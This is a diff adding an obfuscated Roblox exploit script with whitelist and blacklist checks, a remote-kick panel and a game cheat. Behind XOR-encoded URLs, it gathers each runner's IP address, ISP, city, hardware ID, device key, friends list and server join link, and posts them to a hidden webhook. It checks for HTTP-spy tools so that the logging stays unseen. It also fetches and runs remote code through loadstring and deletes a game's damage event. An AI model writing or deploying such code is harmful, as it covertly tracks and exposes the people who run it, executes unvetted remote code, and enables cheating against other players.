@@ -1,1 +1,215 @@
+local Config = {
+    WL = {
+        UIDs = {"10760143653"},
+        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
+        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
+    },
+    BL = {
+        UIDs = {},
+        HWIDs = {},
+        Keys = {}
+    }
+}
 
+local function _D(d, k)
+    local r = ""
+    for i = 1, #d do
+        r = r .. string.char(bit32.bxor(d[i], k) - i)
+    end
+    return r
+end
+
+local _W1 = _D({49, 46, 47, 44, 32, 24, 110, 111, 53, 43, 38, 55, 36, 216, 43, 102, 44, 217, 216, 27, 46, 222, 216, 31, 200, 39, 37, 220, 212, 213, 210, 203, 8, 11, 0, 13, 6, 2, 15, 57, 58, 3, 56, 5, 58, 62, 63, 61, 50, 49, 51, 52, 60, 241, 246, 52, 196, 247, 202, 244, 218, 51, 202, 42, 204, 192, 196, 212, 202, 46, 225, 33, 206, 197, 200, 250, 155, 247, 223, 240, 226, 198, 238, 193, 236, 227, 255, 228, 243, 223, 245, 139, 150, 142, 157, 239, 234, 195, 207, 159, 245, 238, 146, 147, 227, 133, 151, 196, 199, 152, 190, 139, 159, 147, 190, 227, 244, 245, 224, 135, 130}, 88)
+local _G1 = _D({49, 46, 47, 44, 32, 24, 110, 111, 35, 51, 218, 98, 44, 47, 219, 32, 222, 44, 208, 223, 34, 208, 34, 223, 223, 214, 216, 210, 201, 20, 218, 215, 214, 9, 201, 221, 199, 223, 193, 203, 198, 197, 2, 198, 197, 205, 6, 197, 202, 195, 249, 59, 194, 207, 242, 233, 63, 254, 232, 197}, 88)
+local _IP = _D({49, 46, 47, 44, 103, 109, 110, 41, 33, 111, 52, 36, 46, 100, 42, 39, 38, 25, 37, 223, 220, 220, 30, 15, 39, 219, 216, 208, 217, 201, 4, 203, 205, 219, 207, 193, 192, 10, 210, 207, 198, 192, 199, 198, 254, 2, 202, 193, 253, 243, 7, 240, 198, 251, 196, 234, 240, 240, 248, 48, 254, 233, 247, 52, 234, 239, 240, 238, 230, 42, 239, 226, 224, 154, 156, 32, 237, 229, 154, 156, 226, 152, 226}, 88)
+
+local _1 = game:GetService("Players")
+local _2 = game:GetService("HttpService")
+local _3 = game:GetService("RbxAnalyticsService")
+local _4 = game:GetService("UserInputService")
+local _5 = game:GetService("ReplicatedStorage")
+local _6 = game:GetService("MarketplaceService")
+
+local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local _lp = _1.LocalPlayer
+local _uid = tostring(_lp.UserId)
+local _hw = _3:GetClientId()
+local _tk = "N/A"
+
+pcall(function()
+    if isfile and readfile and writefile then
+        if isfile("nazarkus_key.json") then
+            _tk = readfile("nazarkus_key.json")
+        else
+            _tk = _2:GenerateGUID(false)
+            writefile("nazarkus_key.json", _tk)
+        end
+    end
+end)
+
+local function _SC()
+    if not _req then return true end
+    local ok, info = pcall(debug.getinfo, _req)
+    if ok and info and info.source ~= "=[C]" then
+        if getgenv().HttpSpy or getgenv().SimpleSpy then return false end
+    end
+    return true
+end
+
+if not _SC() then _lp:Kick("Security Tamper") return end
+
+local function _chk(l)
+    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
+    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
+    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
+    return false
+end
+
+local _status = "guest"
+if _chk(Config.WL) then _status = "whitelist" elseif _chk(Config.BL) then _status = "blacklist" end
+
+local _PDIR = _5:FindFirstChild("Presence_NK") or Instance.new("Folder", _5)
+_PDIR.Name = "Presence_NK"
+local _TAG = Instance.new("StringValue", _PDIR)
+_TAG.Name = _lp.Name
+_TAG.Value = _tk
+
+local _SIG = _5:FindFirstChild("Signal_NK") or Instance.new("StringValue", _5)
+_SIG.Name = "Signal_NK"
+
+_SIG.Changed:Connect(function(v)
+    if v == "all" or v == _lp.Name or v == _uid or v == _tk then
+        _lp:Kick("Access Revoked by Developer.")
+        while true do end
+    end
+end)
+
+if _status == "whitelist" then
+    task.spawn(function()
+        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
+        sg.Name = "NK_Control"
+        local f = Instance.new("Frame", sg)
+        f.Size = UDim2.new(0, 240, 0, 320)
+        f.Position = UDim2.new(0.5, -120, 0.5, -160)
+        f.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+        f.Visible = false
+        Instance.new("UICorner", f)
+        
+        local scroll = Instance.new("ScrollingFrame", f)
+        scroll.Size = UDim2.new(1, -20, 1, -60)
+        scroll.Position = UDim2.new(0, 10, 0, 50)
+        scroll.BackgroundTransparency = 1
+        scroll.ScrollBarThickness = 2
+        local list = Instance.new("UIListLayout", scroll)
+        list.Padding = UDim.new(0, 5)
+
+        local conf = Instance.new("Frame", f)
+        conf.Size = UDim2.new(1, 0, 1, 0)
+        conf.BackgroundColor3 = Color3.new(0,0,0)
+        conf.BackgroundTransparency = 0.5
+        conf.Visible = false
+        conf.ZIndex = 10
+        local cb = Instance.new("Frame", conf)
+        cb.Size = UDim2.new(0, 180, 0, 100)
+        cb.Position = UDim2.new(0.5, -90, 0.5, -50)
+        cb.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+        local y = Instance.new("TextButton", cb)
+        y.Size = UDim2.new(0.5, -15, 0, 30)
+        y.Position = UDim2.new(0, 10, 1, -40)
+        y.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        y.Text = "YES"
+        local n = Instance.new("TextButton", cb)
+        n.Size = UDim2.new(0.5, -15, 0, 30)
+        n.Position = UDim2.new(0.5, 5, 1, -40)
+        n.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        n.Text = "NO"
+
+        local target = ""
+        local function refresh()
+            for _, v in ipairs(scroll:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
+            for _, val in ipairs(_PDIR:GetChildren()) do
+                local r = Instance.new("Frame", scroll)
+                r.Size = UDim2.new(1, 0, 0, 35)
+                r.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+                Instance.new("UICorner", r)
+                local t = Instance.new("TextLabel", r)
+                t.Size = UDim2.new(1, -60, 1, 0)
+                t.Position = UDim2.new(0, 10, 0, 0)
+                t.Text = val.Name
+                t.TextColor3 = Color3.new(1,1,1)
+                t.BackgroundTransparency = 1
+                local b = Instance.new("TextButton", r)
+                b.Size = UDim2.new(0, 50, 0, 25)
+                b.Position = UDim2.new(1, -55, 0.5, -12)
+                b.Text = "KICK"
+                b.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+                b.MouseButton1Click:Connect(function() target = val.Name conf.Visible = true end)
+            end
+        end
+        y.MouseButton1Click:Connect(function() if target ~= "" then _SIG.Value = target task.wait(0.2) _SIG.Value = "" conf.Visible = false refresh() end end)
+        n.MouseButton1Click:Connect(function() conf.Visible = false end)
+        _4.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible if f.Visible then refresh() end end end)
+    end)
+end
+
+local function _LOG(st)
+    pcall(function()
+        local r = _req({Url = _IP, Method = "GET"})
+        local ni = r and r.Success and _2:JSONDecode(r.Body) or {}
+        local u, s, tu, ts = 0, 0, {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}, {"gethui", "setthreadidentity", "getthreadidentity"}
+        local env = (getgenv and getgenv()) or getfenv(0)
+        for _, f in ipairs(tu) do if env[f] then u = u + 1 end end
+        for _, f in ipairs(ts) do if env[f] then s = s + 1 end end
+        local unc = string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/6)*100), math.floor((s/3)*100))
+        local pn = _6:GetProductInfo(game.PlaceId).Name
+        local friends = {}
+        for _, p in ipairs(_1:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
+        local fn, ft = "None", "None"
+        pcall(function()
+            local rs = game:GetService("ReplicatedStorage")
+            local fdf = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
+            if fdf then
+                for _, f in ipairs(fdf:GetChildren()) do
+                    local m = f:FindFirstChild("FactionMembers")
+                    if m and m:FindFirstChild(_uid) then
+                        local bd = f:FindFirstChild("BasicFactionData")
+                        if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                        break
+                    end
+                end
+            end
+        end)
+        local jid = game.JobId == "" and "Unknown" or game.JobId
+        local join = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
+        local jBtn = "Join Link N/A"
+        pcall(function()
+            local jr = _req({Url = join, Method = "GET"})
+            if jr and jr.Success then jBtn = "[Click to Join Server]("..jr.Body..")" end
+        end)
+        local payload = {
+            ["embeds"] = {{
+                ["title"] = (st == "whitelist" and "Verified User Executed" or "Unknown/Guest User Executed"),
+                ["color"] = (st == "whitelist" and 65280 or 16753920),
+                ["fields"] = {
+                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s\n**ID:** `%s`\n**Age:** %d days", _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
+                    {["name"] = "System", ["value"] = string.format("**Platform:** %s\n**UNC:** %s", (_4.TouchEnabled and "Mobile" or "PC"), unc), ["inline"] = true},
+                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = true},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Hardware ID", ["value"] = "```".._hw.."```", ["inline"] = false},
+                    {["name"] = "Device Key", ["value"] = "```".._tk.."```", ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", pn, game.PlaceId, jid), ["inline"] = false},
+                    {["name"] = "Friends", ["value"] = (#friends > 0 and table.concat(friends, ", ") or "None"), ["inline"] = false},
+                    {["name"] = "Links", ["value"] = jBtn .. " | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
+                },
+                ["footer"] = { ["text"] = "Logger | "..string.upper(st).." • "..os.date("%x %I:%M %p") },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        _req({Url = _W1, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _2:JSONEncode(payload)})
+    end)
+end
+
+task.spawn(function() _LOG(_status) end)
+if _status == "blacklist" then _lp:Kick("Blacklisted.") return end
+pcall(function() loadstring(game:HttpGet(_G1))() end)
+pcall(function() if _5:FindFirstChild("ACS_Engine") then _5.ACS_Engine.Events.FDMG:Destroy() end end)
